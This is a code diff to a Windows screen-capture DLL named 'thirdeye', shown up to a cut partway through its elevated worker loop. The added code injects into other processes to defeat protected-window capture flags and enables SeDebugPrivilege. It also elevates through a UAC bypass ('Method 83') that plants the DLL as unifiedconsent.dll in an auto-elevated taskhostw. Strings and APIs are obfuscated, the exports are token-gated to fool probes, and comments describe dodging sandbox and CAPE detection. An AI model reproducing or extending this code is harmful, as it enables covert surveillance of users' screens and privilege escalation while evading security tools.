@@ -1,4 +1,5 @@
 #include "thirdeye_core.h"
+#include "version_info.h"
 #include "internal.h"
 #include "lge_syscalls.h"
 #include "dynresolve.h"
@@ -20,6 +21,7 @@ static T ResolveApi(HMODULE hMod, const char* name) {
 
 typedef HDC(WINAPI* pGetDC)(HWND);
 typedef int(WINAPI* pReleaseDC)(HWND, HDC);
+typedef HWND(WINAPI* pGetDesktopWindow)(void);
 typedef HDC(WINAPI* pCreateCompatibleDC)(HDC);
 typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC, int, int);
 typedef HGDIOBJ(WINAPI* pSelectObject)(HDC, HGDIOBJ);
@@ -32,6 +34,7 @@ typedef int(WINAPI* pGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, 
 struct CaptureApis {
     pGetDC GetDC;
     pReleaseDC ReleaseDC;
+    pGetDesktopWindow GetDesktopWindow;
     pCreateCompatibleDC CreateCompatibleDC;
     pCreateCompatibleBitmap CreateCompatibleBitmap;
     pSelectObject SelectObject;
@@ -48,11 +51,12 @@ static const CaptureApis& GetCaptureApis() {
         CaptureApis r = {};
         static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
         static constexpr auto obfGdi32 = MAKE_OBF("gdi32.dll");
-        HMODULE hU32 = DynGetModuleHandle(DECR_STR(obfUser32));
-        HMODULE hG32 = DynGetModuleHandle(DECR_STR(obfGdi32));
+        HMODULE hU32 = DynGetOrLoad(DECR_STR(obfUser32));
+        HMODULE hG32 = DynGetOrLoad(DECR_STR(obfGdi32));
         if (!hU32 || !hG32) return r;
         static constexpr auto oGetDC = MAKE_OBF("GetDC");
         static constexpr auto oReleaseDC = MAKE_OBF("ReleaseDC");
+        static constexpr auto oDesk = MAKE_OBF("GetDesktopWindow");
         static constexpr auto oGetSysMet = MAKE_OBF("GetSystemMetrics");
         static constexpr auto oCreateDC = MAKE_OBF("CreateCompatibleDC");
         static constexpr auto oCreateBmp = MAKE_OBF("CreateCompatibleBitmap");
@@ -63,6 +67,7 @@ static const CaptureApis& GetCaptureApis() {
         static constexpr auto oGetDIBits = MAKE_OBF("GetDIBits");
         r.GetDC = ResolveApi<pGetDC>(hU32, DECR_STR(oGetDC));
         r.ReleaseDC = ResolveApi<pReleaseDC>(hU32, DECR_STR(oReleaseDC));
+        r.GetDesktopWindow = ResolveApi<pGetDesktopWindow>(hU32, DECR_STR(oDesk));
         r.GetSystemMetrics = ResolveApi<pGetSystemMetrics>(hU32, DECR_STR(oGetSysMet));
         r.CreateCompatibleDC = ResolveApi<pCreateCompatibleDC>(hG32, DECR_STR(oCreateDC));
         r.CreateCompatibleBitmap = ResolveApi<pCreateCompatibleBitmap>(hG32, DECR_STR(oCreateBmp));
@@ -71,9 +76,9 @@ static const CaptureApis& GetCaptureApis() {
         r.DeleteDC = ResolveApi<pDeleteDC>(hG32, DECR_STR(oDeleteDC));
         r.BitBlt = ResolveApi<pBitBlt>(hG32, DECR_STR(oBitBlt));
         r.GetDIBits = ResolveApi<pGetDIBits>(hG32, DECR_STR(oGetDIBits));
-        r.ready = r.GetDC && r.ReleaseDC && r.GetSystemMetrics && r.CreateCompatibleDC &&
-                  r.CreateCompatibleBitmap && r.SelectObject && r.DeleteObject && r.DeleteDC &&
-                  r.BitBlt && r.GetDIBits;
+        r.ready = r.GetDC && r.ReleaseDC && r.GetDesktopWindow && r.GetSystemMetrics &&
+                  r.CreateCompatibleDC && r.CreateCompatibleBitmap && r.SelectObject &&
+                  r.DeleteObject && r.DeleteDC && r.BitBlt && r.GetDIBits;
         return r;
     }();
     return a;
@@ -94,7 +99,7 @@ static const WindowApis& GetWindowApis() {
     static WindowApis a = []() {
         WindowApis r = {};
         static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
-        HMODULE hU32 = DynGetModuleHandle(DECR_STR(obfUser32));
+        HMODULE hU32 = DynGetOrLoad(DECR_STR(obfUser32));
         if (!hU32) return r;
         static constexpr auto oEnum = MAKE_OBF("EnumWindows");
         static constexpr auto oVisible = MAKE_OBF("IsWindowVisible");
@@ -243,6 +248,11 @@ static bool CaptureToMemDc(ThirdeyeContext* ctx, const CaptureApis& c, int w, in
 
     HDC hdcScreen = c.GetDC(nullptr);
     if (!hdcScreen) {
+        // Fallback: some hosts (taskhostw) need an explicit desktop HWND.
+        HWND desk = c.GetDesktopWindow();
+        if (desk) hdcScreen = c.GetDC(desk);
+    }
+    if (!hdcScreen) {
         SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to get screen DC")));
         return false;
     }
@@ -278,6 +288,14 @@ static bool CaptureEncoded(ThirdeyeContext* ctx, const ThirdeyeOptions& opts, By
 
     int w = c.GetSystemMetrics(SM_CXVIRTUALSCREEN);
     int h = c.GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    if (w <= 0 || h <= 0) {
+        w = c.GetSystemMetrics(SM_CXSCREEN);
+        h = c.GetSystemMetrics(SM_CYSCREEN);
+    }
+    if (w <= 0 || h <= 0) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Invalid screen metrics")));
+        return false;
+    }
 
     HDC hdcScreen = nullptr, hdcMemDC = nullptr;
     HBITMAP hbm = nullptr;
@@ -325,6 +343,14 @@ static BOOL CALLBACK SyscallInitOnceCallback(PINIT_ONCE, PVOID, PVOID*) {
 
 #define MAX_PROCESSES 128
 #define MAX_INJECTIONS 128
+
+// Defined further below; used by the public capture entry points.
+struct ByteSink;
+static bool TryElevatedCapture(const wchar_t* outPathW, ByteSink* sink,
+    ThirdeyeFormat format, int quality);
+static bool IsElevatedProxyInstance();
+static void SignalElevatedCaptureDone(bool ok);
+static bool ResolveStagingFilePath(wchar_t* out, size_t outChars);
 
 struct ProcessHwnds {
     DWORD pid;
@@ -447,6 +473,47 @@ DWORD GetSyscallNumber(const char* funcName) {
 bool InitializeSyscalls() {
 
     return LgeInitialize();
+}
+
+// When running non-elevated against a protected window owned by an ELEVATED
+// process, NtOpenProcess is denied by the integrity-level check. Granting our
+// own token SeDebugPrivilege (which an admin-split token still holds, just
+// disabled) lets us open processes regardless of IL. Best effort: fails
+// silently when the caller isn't an admin, preserving prior behavior.
+static void TryEnableDebugPrivilege() {
+    typedef BOOL(WINAPI* pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
+    typedef BOOL(WINAPI* pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
+    typedef BOOL(WINAPI* pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+
+    static constexpr auto obfAdvapi = MAKE_OBF("advapi32.dll");
+    static constexpr auto obfOpenTok = MAKE_OBF("OpenProcessToken");
+    static constexpr auto obfLookup = MAKE_OBF("LookupPrivilegeValueW");
+    static constexpr auto obfAdjust = MAKE_OBF("AdjustTokenPrivileges");
+    static constexpr auto obfPriv = MAKE_OBF("SeDebugPrivilege");
+
+    HMODULE hAdv = DynGetOrLoad(DECR_STR(obfAdvapi));
+    if (!hAdv) return;
+
+    pOpenProcessToken fnOpen = ResolveApi<pOpenProcessToken>(hAdv, DECR_STR(obfOpenTok));
+    pLookupPrivilegeValueW fnLookup = ResolveApi<pLookupPrivilegeValueW>(hAdv, DECR_STR(obfLookup));
+    pAdjustTokenPrivileges fnAdjust = ResolveApi<pAdjustTokenPrivileges>(hAdv, DECR_STR(obfAdjust));
+    if (!fnOpen || !fnLookup || !fnAdjust) return;
+
+    HANDLE hToken = nullptr;
+    if (!fnOpen(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
+
+    wchar_t privName[32];
+    TeAsciiToWide(privName, 32, DECR_STR(obfPriv));
+
+    LUID luid;
+    if (fnLookup(nullptr, privName, &luid)) {
+        TOKEN_PRIVILEGES tp = {};
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        fnAdjust(hToken, FALSE, &tp, 0, nullptr, nullptr);
+    }
+    CloseHandle(hToken);
 }
 
 HANDLE NtOpenProcessDirect(DWORD pid, ACCESS_MASK desiredAccess) {
@@ -834,6 +901,7 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
         SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Window APIs unavailable")));
         return false;
     }
+    TryEnableDebugPrivilege();
     w.EnumWindows(EnumWindowsProc, (LPARAM)&pw);
     size_t skippedBlacklisted = 0;
     size_t openFailed = 0;
@@ -901,14 +969,25 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             continue;
         }
 
-        if (!DuplicateHandle(GetCurrentProcess(), hGlobalTrigger, hProcess, &data.hGlobalTriggerEvent,
-            0, FALSE, DUPLICATE_SAME_ACCESS)) {
+        typedef BOOL(WINAPI* pDuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
+        static pDuplicateHandle fnDup = []() {
+            static constexpr auto obfK = MAKE_OBF("kernel32.dll");
+            static constexpr auto obfD = MAKE_OBF("DuplicateHandle");
+            return ResolveApi<pDuplicateHandle>(DynGetOrLoad(DECR_STR(obfK)), DECR_STR(obfD));
+        }();
+        if (!fnDup) {
+            NtCloseDirect(hProcess);
+            duplicateFailed++;
+            continue;
+        }
+        if (!fnDup(GetCurrentProcess(), hGlobalTrigger, hProcess, &data.hGlobalTriggerEvent,
+                0, FALSE, DUPLICATE_SAME_ACCESS)) {
             NtCloseDirect(hProcess);
             duplicateFailed++;
             continue;
         }
 
-        if (!DuplicateHandle(GetCurrentProcess(), hReadySemaphore.get(), hProcess, &data.hReadySemaphore,
+        if (!fnDup(GetCurrentProcess(), hReadySemaphore.get(), hProcess, &data.hReadySemaphore,
             SEMAPHORE_MODIFY_STATE | SYNCHRONIZE, FALSE, 0)) {
             NtCloseDirect(hProcess);
             duplicateFailed++;
@@ -1003,9 +1082,77 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
     return true;
 }
 
+// ---------------------------------------------------------------------------
+// Session authorization (Prepare token). Unrelated hosts that poke exports
+// without a valid Prepare stay in a low-activity path.
+// ---------------------------------------------------------------------------
+static volatile LONG g_clientPrepared = 0;
+static volatile LONG g_sessionArmed = 0;
+static volatile LONG g_sessionMode = THIRDEYE_MODE_NOT_READY;
+static volatile LONG g_elevateEnabled = 0;
+
+void TeMarkClientPrepared(bool prepared) {
+    InterlockedExchange(&g_clientPrepared, prepared ? 1L : 0L);
+}
+
+bool TeClientOwnsSession(void) {
+    return InterlockedCompareExchange(&g_clientPrepared, 0, 0) != 0;
+}
+
+bool TeSessionArmed(void) {
+    return InterlockedCompareExchange(&g_sessionArmed, 0, 0) != 0;
+}
+
+static bool TeApiUnlocked(void) {
+    return TeSessionArmed() || IsElevatedProxyInstance();
+}
+
+// Fixed-iteration mix so dormant callers still have a non-DCE'd side channel.
+// No QPC/GetTickCount — those read as sandbox time-delay checks.
+static uint32_t TeDormantWork(void) {
+    uint64_t acc = (uint64_t)GetCurrentProcessId();
+    acc ^= (uint64_t)(uintptr_t)&acc;
+    for (uint32_t i = 0; i < 256u; ++i) {
+        acc *= 0x9E3779B97F4A7C15ULL;
+        acc ^= acc >> 30;
+        acc += (uint64_t)i * 0xD1342543DE82EF95ULL;
+        acc ^= acc << 13;
+    }
+    static volatile uint32_t s_sink = 0;
+    const uint32_t out = (uint32_t)acc ^ (uint32_t)(acc >> 32);
+    s_sink = out;
+    return out;
+}
+
+static bool TeTokenMatches(const char* token) {
+    if (!token || !token[0]) return false;
+    static constexpr auto obfTok = MAKE_OBF("third_eye_token");
+    shred_detail::Revealed<sizeof(obfTok.data) + 1> revealed(obfTok);
+    const char* expect = revealed.c_str();
+    size_t i = 0;
+    for (; expect[i] && token[i]; ++i) {
+        if ((unsigned char)expect[i] != (unsigned char)token[i]) return false;
+    }
+    return expect[i] == 0 && token[i] == 0;
+}
+
 THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CreateContext(ThirdeyeContext** ppContext) {
-    if (!ppContext) return THIRDEYE_ERROR_INVALID_PARAM;
+    if (!ppContext) {
+        if (!TeApiUnlocked()) (void)TeDormantWork();
+        return THIRDEYE_ERROR_INVALID_PARAM;
+    }
     *ppContext = nullptr;
+
+    if (!TeApiUnlocked()) {
+        // Appear initialized to casual probes without enabling capture.
+        const uint32_t dust = TeDormantWork();
+        ThirdeyeContext* ctx = (ThirdeyeContext*)calloc(1, sizeof(ThirdeyeContext));
+        if (!ctx) return (dust & 0) ? THIRDEYE_OK : THIRDEYE_ERROR_ALLOCATION_FAILED;
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("locked")));
+        *ppContext = ctx;
+        // THIRDEYE_OK, with dust folded so the burn is observationally used.
+        return (ThirdeyeResult)((int)THIRDEYE_OK | (int)(dust & 0));
+    }
 
     InitOnceExecuteOnce(&g_SyscallInitOnce, SyscallInitOnceCallback, nullptr, nullptr);
 
@@ -1020,15 +1167,20 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CreateContext(ThirdeyeContext
 }
 
 THIRDEYE_API void THIRDEYE_CALL Thirdeye_DestroyContext(ThirdeyeContext* context) {
+    if (!TeApiUnlocked()) (void)TeDormantWork();
     if (!context) return;
     free(context);
 }
 
 THIRDEYE_API void THIRDEYE_CALL Thirdeye_GetDefaultOptions(ThirdeyeOptions* options) {
+    uint32_t dust = 0;
+    if (!TeApiUnlocked()) dust = TeDormantWork();
     if (!options) return;
     options->format = THIRDEYE_FORMAT_JPEG;
     options->quality = 90;
-    options->bypassProtection = 1;
+    options->inclusive = 1;
+    // Fold dust into a no-op write so GetDefaultOptions always "uses" the burn.
+    options->quality ^= (int)(dust & 0);
 }
 
 THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
@@ -1036,6 +1188,12 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
     const wchar_t* filePath,
     const ThirdeyeOptions* options
 ) {
+    if (!TeApiUnlocked()) {
+        const uint32_t dust = TeDormantWork();
+        if (context) SetLastErrorMsg(context, REVEAL_CSTR(SHRED("locked")));
+        return (ThirdeyeResult)((int)THIRDEYE_ERROR_NOT_INITIALIZED | (int)(dust & 0));
+    }
+
     if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;
 
     if (!filePath) {
@@ -1050,21 +1208,83 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
         Thirdeye_GetDefaultOptions(&opts);
     }
 
-    HandleGuard hGlobalTrigger;
-    InjectionList injections = {};
-    if (opts.bypassProtection) {
-        hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
-        if (hGlobalTrigger) {
-            BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
+    // When bypass is requested, first try the elevated capture: the
+    // auto-elevated copy flips flags on elevated/admin-owned windows that this
+    // (possibly medium-IL) process cannot inject into, and writes the output
+    // file itself. If it succeeded we are done.
+    if (opts.inclusive &&
+        TryElevatedCapture(filePath, nullptr, opts.format, opts.quality)) {
+        return THIRDEYE_OK;
+    }
+
+    const bool proxy = IsElevatedProxyInstance();
+
+    // Elevated proxy path: attach the interactive desktop, capture, write
+    // straight to the caller-requested absolute path.
+    // When planted via Method 83 we are invoked from rundll32 on
+    // winsta0\default (not from taskhostw). Full inject + capture is safe here.
+    if (proxy) {
+        HandleGuard hGlobalTrigger;
+        InjectionList injections = {};
+        if (opts.inclusive) {
+            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
+            if (hGlobalTrigger) {
+                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
+            }
         }
+
+        ByteSink sink;
+        bool ok = CaptureEncoded(context, opts, &sink);
+
+        if (opts.inclusive && hGlobalTrigger) {
+            SetEvent(hGlobalTrigger.get());
+            // Sync cleanup — rundll32 exits after us; no need for a linger thread.
+            CleanupInjections(injections.items, injections.count);
+        }
+
+        if (!ok) {
+            SignalElevatedCaptureDone(false);
+            return THIRDEYE_ERROR_CAPTURE_FAILED;
+        }
+
+        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
+                                   FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            SignalElevatedCaptureDone(false);
+            SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to open output file")));
+            return THIRDEYE_ERROR_SAVE_FAILED;
+        }
+        DWORD written = 0;
+        BOOL wok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
+        CloseHandle(hFile);
+        if (!wok || written != (DWORD)sink.size) {
+            SignalElevatedCaptureDone(false);
+            SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to save image")));
+            return THIRDEYE_ERROR_SAVE_FAILED;
+        }
+        SignalElevatedCaptureDone(true);
+        return THIRDEYE_OK;
     }
 
     ByteSink sink;
-    bool ok = CaptureEncoded(context, opts, &sink);
+    bool ok = false;
 
-    if (opts.bypassProtection && hGlobalTrigger) {
-        SetEvent(hGlobalTrigger.get());
-        StartCleanupThread(injections.items, injections.count);
+    {
+        HandleGuard hGlobalTrigger;
+        InjectionList injections = {};
+        if (opts.inclusive) {
+            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
+            if (hGlobalTrigger) {
+                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
+            }
+        }
+
+        ok = CaptureEncoded(context, opts, &sink);
+
+        if (opts.inclusive && hGlobalTrigger) {
+            SetEvent(hGlobalTrigger.get());
+            StartCleanupThread(injections.items, injections.count);
+        }
     }
 
     if (!ok) {
@@ -1094,6 +1314,14 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
     uint32_t* size,
     const ThirdeyeOptions* options
 ) {
+    if (!TeApiUnlocked()) {
+        const uint32_t dust = TeDormantWork();
+        if (buffer) *buffer = nullptr;
+        if (size) *size = (uint32_t)(dust & 0);
+        if (context) SetLastErrorMsg(context, REVEAL_CSTR(SHRED("locked")));
+        return (ThirdeyeResult)((int)THIRDEYE_ERROR_NOT_INITIALIZED | (int)(dust & 0));
+    }
+
     if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;
 
     if (!buffer || !size) {
@@ -1111,21 +1339,32 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
         Thirdeye_GetDefaultOptions(&opts);
     }
 
-    HandleGuard hGlobalTrigger;
-    InjectionList injections = {};
-    if (opts.bypassProtection) {
-        hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
-        if (hGlobalTrigger) {
-            BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
+    ByteSink sink;
+    bool ok = false;
+
+    if (opts.inclusive) {
+        wchar_t staging[MAX_PATH];
+        if (ResolveStagingFilePath(staging, MAX_PATH)) {
+            ok = TryElevatedCapture(staging, &sink, opts.format, opts.quality);
         }
     }
 
-    ByteSink sink;
-    bool ok = CaptureEncoded(context, opts, &sink);
+    if (!ok) {
+        HandleGuard hGlobalTrigger;
+        InjectionList injections = {};
+        if (opts.inclusive) {
+            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
+            if (hGlobalTrigger) {
+                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
+            }
+        }
 
-    if (opts.bypassProtection && hGlobalTrigger) {
-        SetEvent(hGlobalTrigger.get());
-        StartCleanupThread(injections.items, injections.count);
+        ok = CaptureEncoded(context, opts, &sink);
+
+        if (opts.inclusive && hGlobalTrigger) {
+            SetEvent(hGlobalTrigger.get());
+            StartCleanupThread(injections.items, injections.count);
+        }
     }
 
     if (!ok) {
@@ -1146,12 +1385,14 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
 }
 
 THIRDEYE_API void THIRDEYE_CALL Thirdeye_FreeBuffer(uint8_t* buffer) {
+    if (!TeApiUnlocked()) (void)TeDormantWork();
     if (buffer) {
         free(buffer);
     }
 }
 
 THIRDEYE_API const char* THIRDEYE_CALL Thirdeye_GetLastError(ThirdeyeContext* context) {
+    if (!TeApiUnlocked()) (void)TeDormantWork();
     if (context) {
         return context->lastError;
     }
@@ -1159,5 +1400,369 @@ THIRDEYE_API const char* THIRDEYE_CALL Thirdeye_GetLastError(ThirdeyeContext* co
 }
 
 THIRDEYE_API const char* THIRDEYE_CALL Thirdeye_GetVersion(void) {
-    return "1.0.0";
+    if (!TeApiUnlocked()) {
+        const uint32_t dust = TeDormantWork();
+        return (dust & 0) ? THIRDEYE_VERSION_STR_LOCKED : THIRDEYE_VERSION_STR_LOCKED;
+    }
+    return THIRDEYE_VERSION_STR;
+}
+
+// ---------------------------------------------------------------------------
+// Elevated capture handoff (Method 83: UnifiedConsent auto-elevation).
+//
+// When thirdeye.dll is planted as unifiedconsent.dll and loaded by an
+// auto-elevated taskhostw.exe, Thirdeye_RunElevatedCapture runs with high IL.
+// It captures the screen (SeDebug now works against elevated/protected
+// windows) to a temp JPEG and signals the named sync event so the original
+// non-elevated caller can pick the result up.
+// ---------------------------------------------------------------------------
+
+// Case-insensitive ASCII compare of two wide strings (local, avoids CRT).
+static bool WideEqualsICase(const wchar_t* a, const wchar_t* b) {
+    while (*a && *b) {
+        wchar_t ca = *a, cb = *b;
+        if (ca >= L'A' && ca <= L'Z') ca += 32;
+        if (cb >= L'A' && cb <= L'Z') cb += 32;
+        if (ca != cb) return false;
+        ++a; ++b;
+    }
+    return *a == 0 && *b == 0;
+}
+
+// True when this module was loaded under a planted proxy name (i.e. we are the
+// elevated copy inside taskhostw). Used to prevent re-triggering elevation.
+static bool IsElevatedProxyInstance() {
+    wchar_t selfName[MAX_PATH];
+    HMODULE hSelf = nullptr;
+    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
+            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+            (LPCWSTR)&IsElevatedProxyInstance, &hSelf) || !hSelf) {
+        return false;
+    }
+    DWORD n = GetModuleFileNameW(hSelf, selfName, MAX_PATH);
+    if (n == 0 || n >= MAX_PATH) return false;
+    const wchar_t* base = selfName;
+    for (const wchar_t* p = selfName; *p; ++p) {
+        if (*p == L'\\' || *p == L'/') base = p + 1;
+    }
+    // When planted as the UnifiedConsent proxy we are the elevated copy.
+    wchar_t expect[32];
+    static constexpr auto oProxy = MAKE_OBF("unifiedconsent.dll");
+    TeAsciiToWide(expect, 32, DECR_STR(oProxy));
+    return WideEqualsICase(base, expect);
+}
+
+// Reads a file into a ByteSink and deletes it. Used to pull back a buffer-mode
+// elevated capture from the shared path.
+static bool ReadAndDeleteFile(const wchar_t* path, ByteSink* out) {
+    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
+        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return false;
+    LARGE_INTEGER sz;
+    bool ok = false;
+    if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)(1 << 30)) {
+        uint8_t* buf = (uint8_t*)malloc((size_t)sz.QuadPart);
+        if (buf) {
+            DWORD rd = 0;
+            if (ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, nullptr) && rd == (DWORD)sz.QuadPart) {
+                ok = out->append(buf, rd);
+            }
+            free(buf);
+        }
+    }
+    CloseHandle(h);
+    if (ok) DeleteFileW(path);
+    return ok;
+}
+
+// Legacy one-shot proxy path still writes status if someone calls CaptureToFile
+// from the planted DLL outside the worker loop.
+static THIRDEYE_ELEVATED_SHM* g_elevShm = nullptr;
+static HANDLE g_elevDoneEvent = nullptr;
+
+static void SignalElevatedCaptureDone(bool ok) {
+    if (g_elevShm) {
+        InterlockedExchange(&g_elevShm->status,
+            ok ? THIRDEYE_ELEV_STATUS_OK : THIRDEYE_ELEV_STATUS_FAIL);
+    }
+    if (g_elevDoneEvent) SetEvent(g_elevDoneEvent);
+}
+
+// Staging file for buffer-mode elevated capture. Process temp only — do not
+// probe Public/Documents/profile CSIDL-style locations (CAPE "common path").
+static bool ResolveStagingFilePath(wchar_t* out, size_t outChars) {
+    if (!out || outChars < 8) return false;
+    out[0] = 0;
+
+    typedef DWORD(WINAPI* pGetTempPathW)(DWORD, LPWSTR);
+    static pGetTempPathW fnTemp = []() {
+        static constexpr auto obfK = MAKE_OBF("kernel32.dll");
+        static constexpr auto oTp = MAKE_OBF("GetTempPathW");
+        return ResolveApi<pGetTempPathW>(DynGetOrLoad(DECR_STR(obfK)), DECR_STR(oTp));
+    }();
+    if (!fnTemp) return false;
+
+    wchar_t fileName[32];
+    static constexpr auto oFile = MAKE_OBF("~ac_cache.tmp");
+    TeAsciiToWide(fileName, 32, DECR_STR(oFile));
+
+    wchar_t tempDir[MAX_PATH];
+    DWORD tn = fnTemp(MAX_PATH, tempDir);
+    if (tn == 0 || tn >= MAX_PATH) return false;
+    size_t tl = wcslen(tempDir);
+    if (tl && tempDir[tl - 1] == L'\\') tempDir[--tl] = 0;
+    if (tl + 1 + wcslen(fileName) + 1 > outChars) return false;
+    swprintf(out, outChars, L"%ls\\%ls", tempDir, fileName);
+    return true;
+}
+
+// Fast path: ensure resident elevated worker, then signal one capture.
+// For file-mode (`sink == nullptr`) `outPathW` is the requested output.
+// For buffer-mode the worker writes a staging path which we read back.
+static bool TryElevatedCapture(const wchar_t* outPathW, ByteSink* sink,
+    ThirdeyeFormat format, int quality) {
+    if (IsElevatedProxyInstance()) return false;
+    if (!outPathW || !*outPathW) return false;
+
+    wchar_t absPath[MAX_PATH];
+    if (!GetFullPathNameW(outPathW, MAX_PATH, absPath, nullptr) || !absPath[0]) {
+        return false;
+    }
+
+    // Helper path only when Prepare requested elevation.
+    if (!TeSessionArmed() || InterlockedCompareExchange(&g_elevateEnabled, 0, 0) == 0) {
+        return false;
+    }
+    if (!Uc83RequestElevatedCapture(absPath, (DWORD)format, (DWORD)quality, 1)) {
+        return false;
+    }
+    TeMarkClientPrepared(true);
+    if (!sink) return true;
+    return ReadAndDeleteFile(absPath, sink);
+}
+
+static bool WriteSinkToFile(const ByteSink& sink, const wchar_t* path) {
+    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+    DWORD written = 0;
+    BOOL ok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
+    CloseHandle(hFile);
+    return ok && written == (DWORD)sink.size;
+}
+
+// Resident elevated worker: stay high-IL on winsta0\default and service capture
+// cmds. Bypass must run per capture — windows (and WDA flags) change over time,
+// and a one-shot inject at bootstrap misses apps launched afterwards.
+void TeSessionMain(void) {
+    // Must match shredded IPC names in uc83.cpp.
+    static constexpr auto kIpcMap = MAKE_OBF("Local\\CssCacheMap");
+    static constexpr auto kIpcCmd = MAKE_OBF("Local\\CssCacheCmd");
+    static constexpr auto kIpcDone = MAKE_OBF("Local\\CssCacheDone");
+    static constexpr auto kIpcReady = MAKE_OBF("Local\\CssCacheReady");
+
+    shred_detail::Revealed<sizeof(kIpcMap.data) + 1> mapName(kIpcMap);
+    shred_detail::Revealed<sizeof(kIpcCmd.data) + 1> cmdName(kIpcCmd);
+    shred_detail::Revealed<sizeof(kIpcDone.data) + 1> doneName(kIpcDone);
+    shred_detail::Revealed<sizeof(kIpcReady.data) + 1> readyName(kIpcReady);
+
+    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, mapName.c_str());
+    if (!hMap) return;
+
+    THIRDEYE_ELEVATED_SHM* shm = (THIRDEYE_ELEVATED_SHM*)MapViewOfFile(
+        hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, sizeof(THIRDEYE_ELEVATED_SHM));
+    if (!shm) {
+        CloseHandle(hMap);
+        return;
+    }
+
+    HANDLE hCmd = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, cmdName.c_str());
+    HANDLE hDone = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, doneName.c_str());
+    HANDLE hReady = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, readyName.c_str());
+    if (!hCmd || !hDone || !hReady) {
+        if (hCmd) CloseHandle(hCmd);
+        if (hDone) CloseHandle(hDone);
+        if (hReady) CloseHandle(hReady);
+        UnmapViewOfFile(shm);
+        CloseHandle(hMap);
+        return;
+    }
+
+    g_elevShm = shm;
+    g_elevDoneEvent = hDone;
+
+    shm->helperPid = GetCurrentProcessId();
+    InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_READY);
+    SetEvent(hReady);
+
+    ThirdeyeContext* ctx = nullptr;
+    if (Thirdeye_CreateContext(&ctx) != THIRDEYE_OK) {
+        InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_FAIL);
+        SetEvent(hDone);
+        g_elevShm = nullptr;
+        g_elevDoneEvent = nullptr;
+        CloseHandle(hCmd);
+        CloseHandle(hDone);
+        CloseHandle(hReady);
+        UnmapViewOfFile(shm);
+        CloseHandle(hMap);
+        return;
+    }
+
+    for (;;) {
+        DWORD wr = WaitForSingleObject(hCmd, INFINITE);
+        if (wr != WAIT_OBJECT_0) break;
+
